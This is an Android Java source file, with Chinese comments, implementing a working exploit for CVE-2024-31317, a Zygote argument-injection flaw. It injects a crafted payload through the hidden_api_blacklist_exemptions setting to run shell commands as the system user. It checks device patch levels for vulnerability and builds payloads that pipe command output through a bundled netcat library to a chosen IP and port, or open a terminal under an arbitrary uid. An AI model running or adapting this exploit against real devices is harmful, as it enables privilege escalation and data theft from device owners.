package com.cfks.cve202431317;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.time.format.DateTimeParseException;

/**
 * CVE-2024-31317 漏洞利用 Poc 类
 * 集成了 RunPayload 和 ZygoteFragment 的 payload 执行能力
 */
public class Poc {
    
    private static final String TAG = "Poc";
    private static final String SETTINGS_KEY = "hidden_api_blacklist_exemptions";
    private static final String SETTINGS_URI = "content://settings/global";
    private static final String CONFIG_FILE_PATH = "/data/local/tmp/zygote_payload.txt";
    private static final int RESET_DELAY_MS = 200;
    
    final static ZygoteArgumentBuilder basePoc;

    static {
        basePoc = new ZygoteArgumentBuilder(30)
            .setUid(1000)
            .setGid(9997)
            .setGroups("3003")
            .setNiceName("zYg0te");
    }

    public static String getNameByUid(int uid) {
        switch (uid) {
            case 0: return "root(0)";
            case 1: return "daemon(1)";
            case 2: return "bin(2)";
            case 1000: return "system(1000)";
            case 1001: return "radio(1001)";
            case 1002: return "graphics(1002)";
            case 1003: return "input(1003)";
            case 1004: return "audio(1004)";
            case 1005: return "camera(1005)";
            case 1006: return "log(1006)";
            case 1007: return "compass(1007)";
            case 1008: return "mount(1008)";
            case 1009: return "wifi(1009)";
            case 1010: return "adb(1010)";
            case 1011: return "install(1011)";
            case 1012: return "media(1012)";
            case 1013: return "dhcp(1013)";
            case 1014: return "sdcard_rw(1014)";
            case 1015: return "vpn(1015)";
            case 1016: return "keystore(1016)";
            case 1017: return "usb(1017)";
            case 1018: return "drm(1018)";
            case 1019: return "mdnsr(1019)";
            case 1020: return "gps(1020)";
            case 1021: return "unused1(1021)";
            case 1022: return "media_rw(1022)";
            case 1023: return "mtp(1023)";
            case 1024: return "nfc(1024)";
            case 1025: return "drmrpc(1025)";
            case 1026: return "epm_rtc(1026)";
            case 1027: return "lock_settings(1027)";
            case 1028: return "credentials(1028)";
            case 1029: return "audioserver(1029)";
            case 1030: return "metrics_collector(1030)";
            case 1031: return "metricsd(1031)";
            case 1032: return "webservd(1032)";
            case 1033: return "debuggerd(1033)";
            case 1034: return "mediadrm(1034)";
            case 1035: return "diskread(1035)";
            case 1036: return "net_bt_admin(1036)";
            case 1037: return "nfc(1037)";
            case 1038: return "sensor(1038)";
            case 1039: return "mediadrm(1039)";
            case 1040: return "camerad(1040)";
            case 1041: return "print(1041)";
            case 1042: return "tether(1042)";
            case 1043: return "trustedui(1043)";
            case 1044: return "rild(1044)";
            case 1045: return "configstore(1045)";
            case 1046: return "wificond(1046)";
            case 1047: return "paccm(1047)";
            case 1048: return "ipacm(1048)";
            case 1049: return "neuralnetworks(1049)";
            case 1050: return "credstore(1050)";
            case 2000: return "shell(2000)";
        }
        return "unknown(" + uid + ")";
    }

    /**
     * 执行系统命令（通过 Zygote 漏洞）
     * 集成了 RunPayload 的 payload 执行能力
     */
    public static StringBuffer startSysShizuku(Context context) throws PackageManager.NameNotFoundException, InterruptedException {
        if (context == null) {
            throw new RuntimeException("Context is null!!");
        }

        StringBuffer sb = new StringBuffer();
        String packageName = context.getApplicationContext().getPackageName();

        if (context.checkSelfPermission("android.permission.WRITE_SECURE_SETTINGS") != PackageManager.PERMISSION_GRANTED) {
            sb.append("No android.permission.WRITE_SECURE_SETTINGS permission : (\n");
            sb.append(String.format("Use pm grant %s android.permission.WRITE_SECURE_SETTINGS to grant it", packageName));
            return sb;
        }
        
        // 获取 PackageManager 实例
        PackageManager packageManager = context.getApplicationContext().getPackageManager();
        // 获取应用的 ApplicationInfo 对象
        ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
        // 获取 lib 库的路径
        String nativeLibraryDir = applicationInfo.nativeLibraryDir;
        String epath = nativeLibraryDir + "/libstellar.so";
        
        sb.append(runSysCommand(context, epath, true));
        
        sb.append("\n\nWARN:If you haven't obtained system permissions, it may be that your phone cannot exploit the vulnerability.");
        sb.append("\n警告:如果你没有获得系统权限，可能是你的手机无法利用该漏洞。");

        sb.append("\n\nIf system permissions are successfully obtained, some applications may fail to open. Please wait 1-2 minutes.");
        sb.append("\n如果成功获取System权限，可能会出现部分应用打不开的情况，请等待1-2分钟");
        return sb;
    }
    
    /**
     * 运行系统命令（通过 Zygote 漏洞）
     * 集成了 RunPayload 的完整 payload 执行流程
     */
    public static StringBuffer runSysCommand(Context context, String command, boolean protect) throws InterruptedException {
        if (context == null) {
            throw new RuntimeException("Context is null!!");
        }
        
        if (command == null) {
            protect = false;
            command = "";
        }

        StringBuffer sb = new StringBuffer();
        String packageName = context.getApplicationContext().getPackageName();

        if (context.checkSelfPermission("android.permission.WRITE_SECURE_SETTINGS") != PackageManager.PERMISSION_GRANTED) {
            sb.append("No android.permission.WRITE_SECURE_SETTINGS permission : (\n");
            sb.append(String.format("Use pm grant %s android.permission.WRITE_SECURE_SETTINGS to grant it", packageName));
            return sb;
        }
        
        String protectCommand = "settings put global hidden_api_blacklist_exemptions \"null\" ; " + command;
        
        protectCommand += " ; pkill -9 sh";
        
        basePoc.setInvokeWithCommand((protect != false) ? protectCommand : command);
        
        basePoc.setGid(9997);
        basePoc.setGroups("3003");
        
        String pocString = basePoc.build();

        sb.append(command + "\n");
        sb.append("use poc\n");
        sb.append("\n");
        sb.append(basePoc.toString());

        // 使用 RunPayload 风格的执行方法
        executePayload(context, pocString);

        return sb;
    }

    /**
     * 执行 Payload（从 RunPayload 移植）
     * 完整保留了原始执行逻辑
     */
    private static void executePayload(Context context, String payload) {
        Log.i(TAG, "Executing payload, length: " + payload.length());

        // 1. 停止 Settings 应用
        shizukuExec("am force-stop com.android.settings");

        // 2. 写入配置文件（使用 base64 保留原始格式）
        writePayloadToFile(payload);

        // 3. 写入系统设置
        writeToSettings(context, payload);

        // 4. 启动 Settings
        shizukuExec("am start -n com.android.settings/.Settings");

        // 5. 延迟重置设置（保持原始延迟时间）
        scheduleSettingsReset(context);
    }

    /**
     * 写入 Payload 到文件（使用 base64 编码保证完整性）
     */
    private static void writePayloadToFile(String payload) {
        try {
            String base64 = Base64.encodeToString(
                    payload.getBytes(StandardCharsets.UTF_8),
                    Base64.NO_WRAP
            );
            shizukuExec("echo '" + base64 + "' | base64 -d > " + CONFIG_FILE_PATH);
        } catch (Exception e) {
            Log.w(TAG, "Base64 write failed, trying fallback", e);
            writePayloadFallback(payload);
        }
    }

    /**
     * 备用写入方法（使用 cat 和 heredoc）
     */
    private static void writePayloadFallback(String payload) {
        try {
            String delimiter = "EOF_" + System.currentTimeMillis();
            String command = String.format(
                    "cat > %s << '%s'\n%s\n%s",
                    CONFIG_FILE_PATH, delimiter, payload, delimiter
            );
            shizukuExec(command);
        } catch (Exception e) {
            Log.e(TAG, "Fallback write failed", e);
        }
    }

    /**
     * 写入系统设置
     */
    private static boolean writeToSettings(Context context, String payload) {
        ContentValues values = new ContentValues();
        values.put(Settings.Global.NAME, SETTINGS_KEY);
        values.put(Settings.Global.VALUE, payload);

        try {
            context.getContentResolver().insert(Uri.parse(SETTINGS_URI), values);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Failed to write settings", e);
            return false;
        }
    }

    /**
     * 延迟重置设置
     */
    private static void scheduleSettingsReset(final Context context) {
        android.os.Handler handler = new android.os.Handler(android.os.Looper.getMainLooper());
        handler.postDelayed(() -> {
            ContentValues values = new ContentValues();
            values.put(Settings.Global.NAME, SETTINGS_KEY);
            values.put(Settings.Global.VALUE, "null");
            try {
                context.getContentResolver().insert(Uri.parse(SETTINGS_URI), values);
            } catch (Exception e) {
                Log.w(TAG, "Failed to reset settings", e);
            }
        }, RESET_DELAY_MS);
    }

    /**
	 * 通过 Stellar 反射执行 Shell 命令，失败时降级到 Runtime.exec()
	 */
	private static String shizukuExec(String command) {
	    StringBuilder output = new StringBuilder();
	
	    // 优先尝试 Stellar
	    try {
	        Class<?> stellarClass = Class.forName("roro.stellar.Stellar");
	        java.lang.reflect.Method newProcessMethod = stellarClass.getMethod(
	            "newProcess", 
	            String[].class, 
	            String[].class, 
	            String.class
	        );
	        
	        Process process = (Process) newProcessMethod.invoke(
	            null,
	            new String[]{"sh", command},
	            null,
	            null
	        );
	
	        // 读取标准输出
	        try (BufferedReader reader = new BufferedReader(
	                new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
	            String line;
	            while ((line = reader.readLine()) != null) {
	                output.append(line).append("\n");
	            }
	        }
	
	        // 读取错误输出
	        try (BufferedReader reader = new BufferedReader(
	                new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8))) {
	            String line;
	            while ((line = reader.readLine()) != null) {
	                output.append(line).append("\n");
	            }
	        }
	
	        int exitCode = process.waitFor();
	        if (exitCode != 0) {
	            Log.w(TAG, "Command exited with code " + exitCode + ": " + command);
	        }
	        
	        return output.toString();
	
	    } catch (ClassNotFoundException e) {
	        Log.w(TAG, "Stellar class not found, falling back to Runtime.exec()");
	    } catch (Exception e) {
	        Log.w(TAG, "Stellar exec failed, falling back to Runtime.exec()", e);
	    }
	
	    // 降级到 Runtime.exec()
	    output.append(runtimeExec(command));
	    return output.toString();
	}

    /**
     * 使用 Runtime.exec() 执行命令（降级方案）
     */
    private static String runtimeExec(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
            
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
            
            process.waitFor();
        } catch (Exception e) {
            Log.e(TAG, "Runtime exec failed", e);
            output.append(e.toString());
        }
        return output.toString();
    }

    private static void startSetting(Context context) {
        String packageName = "com.android.settings";
        PackageManager packageManager = context.getPackageManager();
        Intent intent = packageManager.getLaunchIntentForPackage(packageName);

        if (intent != null) {
            context.startActivity(intent);
        }
    }

    /**
     * 检查当前设备是否可能受漏洞影响
     */
    public static boolean canUsePoc() {
        return Build.VERSION.SDK_INT >= 28 && Build.VERSION.SDK_INT <= 33 && !isSecurityPatchUpToDate(); 
    }

    /**
     * 获取安全补丁级别
     */
    public static String getSecurityPatchLevel() {
        return Build.VERSION.SECURITY_PATCH;
    }

    /**
     * 判断安全补丁是否过期（以 2024-06-01 为漏洞底线）
     * @return true 表示安全，false 表示存在风险
     */
    public static boolean isSecurityPatchUpToDate() {
        String patchStr = getSecurityPatchLevel();
        if (patchStr == null || patchStr.isEmpty()) {
            return false;
        }

        try {
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
            LocalDate patchDate = LocalDate.parse(patchStr, formatter);
            LocalDate cutoffDate = LocalDate.of(2024, 6, 1);

            return !patchDate.isBefore(cutoffDate);
        } catch (DateTimeParseException e) {
            return false;
        }
    }

    /**
     * 构建自定义 Payload（新增方法，参考 ZygoteFragment）
     * @param command 要执行的命令
     * @param ip 回调 IP
     * @param port 回调端口
     * @param nativeLibDir native 库目录
     * @return 完整的 Payload 字符串
     */
    public static String buildExecutePayload(String command, String ip, String port, String nativeLibDir) {
        if (command == null || nativeLibDir == null) {
            return null;
        }
        
        String sanitizedCommand = command;
        boolean isAndroid12To13 = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && 
                                   Build.VERSION.SDK_INT <= Build.VERSION_CODES.TIRAMISU;
        
        if (isAndroid12To13) {
            return basePoc.build() + 
                "/system/bin/logwrapper echo zYg0te $(" + sanitizedCommand + 
                " | " + nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ")" + 
                getPayloadBuffer();
        } else {
            return basePoc.build() + 
                "echo \"$(" + sanitizedCommand + ")\" | " + 
                nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ";" + 
                getPayloadBuffer();
        }
    }

    /**
     * 构建 Shell Payload（新增方法，参考 ZygoteFragment）
     */
    public static String buildShellPayload(String uidStr, String nativeLibDir) {
        if (nativeLibDir == null) {
            return null;
        }
        
        boolean isAndroid12To13 = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && 
                                   Build.VERSION.SDK_INT <= Build.VERSION_CODES.TIRAMISU;
        
        if (isAndroid12To13) {
            return basePoc.build() + 
                "/system/bin/logwrapper echo zYg0te $(/system/bin/setsid " + 
                nativeLibDir + "/libzygote_term.so " + uidStr + ")" + 
                getPayloadBuffer();
        } else {
            return basePoc.build() + 
                "echo $(setsid " + nativeLibDir + "/libzygote_term.so " + uidStr + ");" + 
                getPayloadBuffer();
        }
    }

    /**
     * 获取 Payload 缓冲区（末尾触发载荷）
     */
    private static String getPayloadBuffer() {
        int count = 4; // DEFAULT_ZYG3
        char[] commas = new char[count];
        java.util.Arrays.fill(commas, ',');
        return " #" + new String(commas) + "X";
    }

    /**
     * 获取当前 ZygoteArgumentBuilder 实例（供外部使用）
     */
    public static ZygoteArgumentBuilder getBasePoc() {
        return basePoc;
    }

    /**
     * 重置 basePoc 配置（用于多次调用）
     */
    public static void resetBasePoc() {
        basePoc.setUid(1000)
               .setGid(9997)
               .setGroups("3003")
               .setNiceName("zYg0te");
    }
}